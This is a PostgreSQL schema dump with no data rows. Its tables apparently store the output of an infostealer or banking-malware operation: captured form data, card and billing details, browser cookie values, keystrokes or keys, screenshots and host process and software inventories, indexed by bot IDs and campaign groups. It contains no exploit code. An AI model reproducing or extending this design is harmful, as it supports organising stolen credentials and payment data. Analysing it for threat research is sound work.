--
-- PostgreSQL database dump
--

-- Dumped from database version 10.18 (Ubuntu 10.18-0ubuntu0.18.04.1)
-- Dumped by pg_dump version 10.18 (Ubuntu 10.18-0ubuntu0.18.04.1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

DROP INDEX public.migrations_hash_idx;
DROP INDEX public.data84_id_low_id_high_type_idx;
DROP INDEX public.data84_group_idx;
DROP INDEX public.data84_created_at_idx;
DROP INDEX public.data83_id_low_id_high_created_at_idx;
DROP INDEX public.data80_id_low_id_high_type_idx;
ALTER TABLE ONLY public.migrations DROP CONSTRAINT migrations_pkey;
ALTER TABLE ONLY public.data DROP CONSTRAINT data_pkey;
ALTER TABLE public.migrations ALTER COLUMN id DROP DEFAULT;
DROP TABLE public.network_archive;
DROP SEQUENCE public.migrations_id_seq;
DROP TABLE public.migrations;
DROP TABLE public.data_archive;
DROP TABLE public.data90;
DROP TABLE public.data84;
DROP TABLE public.data83;
DROP TABLE public.data80;
DROP TABLE public.data;
DROP TABLE public.cookies_archive;
DROP TABLE public.brow_archive;
DROP TABLE public.adfinder_archive;
DROP EXTENSION plpgsql;
DROP SCHEMA public;
--
-- Name: public; Type: SCHEMA; Schema: -; Owner: postgres
--

CREATE SCHEMA public;


ALTER SCHEMA public OWNER TO postgres;

--
-- Name: SCHEMA public; Type: COMMENT; Schema: -; Owner: postgres
--

COMMENT ON SCHEMA public IS 'standard public schema';


--
-- Name: plpgsql; Type: EXTENSION; Schema: -; Owner:
--

CREATE EXTENSION IF NOT EXISTS plpgsql WITH SCHEMA pg_catalog;


--
-- Name: EXTENSION plpgsql; Type: COMMENT; Schema: -; Owner:
--

COMMENT ON EXTENSION plpgsql IS 'PL/pgSQL procedural language';


SET default_tablespace = '';

SET default_with_oids = false;

--
-- Name: adfinder_archive; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.adfinder_archive (
    id_low bigint,
    id_high bigint,
    created_at timestamp without time zone,
    "group" character varying(64),
    formdata text,
    cardinfo text,
    billinginfo text
);


ALTER TABLE public.adfinder_archive OWNER TO postgres;

--
-- Name: brow_archive; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.brow_archive (
    id_low bigint DEFAULT 0 NOT NULL,
    id_high bigint DEFAULT 0 NOT NULL,
    "group" character(64),
    os character(65),
    os_ver character(25),
    data bytea,
    source character(1024),
    created_at timestamp without time zone DEFAULT now(),
    type integer DEFAULT 0 NOT NULL
);


ALTER TABLE public.brow_archive OWNER TO postgres;

--
-- Name: cookies_archive; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.cookies_archive (
    id_low bigint DEFAULT 0 NOT NULL,
    id_high bigint DEFAULT 0 NOT NULL,
    "group" character(64),
    created_at timestamp without time zone DEFAULT now(),
    username text,
    browser text,
    domain text,
    cookie_name text,
    cookie_value text,
    created text,
    expires text,
    path text
);


ALTER TABLE public.cookies_archive OWNER TO postgres;

--
-- Name: data; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.data (
    created_at timestamp without time zone NOT NULL,
    "group" character varying(255),
    data bytea,
    keys character varying(1024),
    image bytea,
    id_low bigint NOT NULL,
    id_high bigint NOT NULL,
    os character(15),
    os_ver character(16),
    link character varying(4096),
    cid_prefix text
);


ALTER TABLE public.data OWNER TO postgres;

--
-- Name: data80; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.data80 (
    id_low bigint NOT NULL,
    id_high bigint NOT NULL,
    "group" character varying(64),
    os character varying(64),
    os_ver character varying(25),
    data bytea,
    source character varying(1024),
    created_at timestamp without time zone,
    type integer NOT NULL
);


ALTER TABLE public.data80 OWNER TO postgres;

--
-- Name: data83; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.data83 (
    id_low bigint NOT NULL,
    id_high bigint NOT NULL,
    created_at timestamp without time zone DEFAULT now() NOT NULL,
    "group" character varying(64) NOT NULL,
    formdata text,
    cardinfo text,
    billinginfo text
);


ALTER TABLE public.data83 OWNER TO postgres;

--
-- Name: data84; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.data84 (
    id_low bigint NOT NULL,
    id_high bigint NOT NULL,
    "group" character varying(64),
    created_at timestamp without time zone,
    username text,
    browser text,
    domain text,
    cookie_name text,
    cookie_value text,
    created text,
    expires text,
    path text,
    secure boolean DEFAULT false NOT NULL,
    httponly boolean DEFAULT false NOT NULL
);


ALTER TABLE public.data84 OWNER TO postgres;

--
-- Name: data90; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.data90 (
    created_at timestamp without time zone,
    "group" character varying(64) NOT NULL,
    id_low bigint,
    id_high bigint,
    process_info text,
    sys_info text,
    dlls text,
    programs text,
    services text
);


ALTER TABLE public.data90 OWNER TO postgres;

--
-- Name: data_archive; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.data_archive (
    created_at timestamp without time zone DEFAULT now(),
    "group" character(255),
    data bytea,
    keys character(1024),
    image bytea,
    id_low bigint DEFAULT 0 NOT NULL,
    id_high bigint DEFAULT 0 NOT NULL,
    os character(15),
    os_ver character(16),
    link character(4096),
    cid_prefix text
);


ALTER TABLE public.data_archive OWNER TO postgres;

--
-- Name: migrations; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.migrations (
    id integer NOT NULL,
    hash character varying(30) NOT NULL,
    name character varying(100) NOT NULL
);


ALTER TABLE public.migrations OWNER TO postgres;

--
-- Name: TABLE migrations; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON TABLE public.migrations IS 'database migrations';


--
-- Name: migrations_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.migrations_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.migrations_id_seq OWNER TO postgres;

--
-- Name: migrations_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.migrations_id_seq OWNED BY public.migrations.id;


--
-- Name: network_archive; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.network_archive (
    id_low bigint DEFAULT 0 NOT NULL,
    id_high bigint DEFAULT 0 NOT NULL,
    "group" character(64),
    created_at timestamp without time zone DEFAULT now(),
    process_info text,
    sys_info text,
    dlls text,
    programs text,
    services text
);


ALTER TABLE public.network_archive OWNER TO postgres;

--
-- Name: migrations id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.migrations ALTER COLUMN id SET DEFAULT nextval('public.migrations_id_seq'::regclass);


--
-- Name: data data_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.data
    ADD CONSTRAINT data_pkey PRIMARY KEY (id_low, id_high, created_at);


--
-- Name: migrations migrations_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.migrations
    ADD CONSTRAINT migrations_pkey PRIMARY KEY (id);


--
-- Name: data80_id_low_id_high_type_idx; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX data80_id_low_id_high_type_idx ON public.data80 USING btree (id_low, id_high, type);


--
-- Name: data83_id_low_id_high_created_at_idx; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX data83_id_low_id_high_created_at_idx ON public.data83 USING btree (id_low, id_high, created_at);


--
-- Name: data84_created_at_idx; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX data84_created_at_idx ON public.data84 USING btree (created_at);


--
-- Name: data84_group_idx; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX data84_group_idx ON public.data84 USING btree ("group");


--
-- Name: data84_id_low_id_high_type_idx; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX data84_id_low_id_high_type_idx ON public.data84 USING btree (id_low, id_high);


--
-- Name: migrations_hash_idx; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX migrations_hash_idx ON public.migrations USING btree (hash);


--
-- Name: SCHEMA public; Type: ACL; Schema: -; Owner: postgres
--

GRANT ALL ON SCHEMA public TO PUBLIC;


--
-- PostgreSQL database dump complete
--
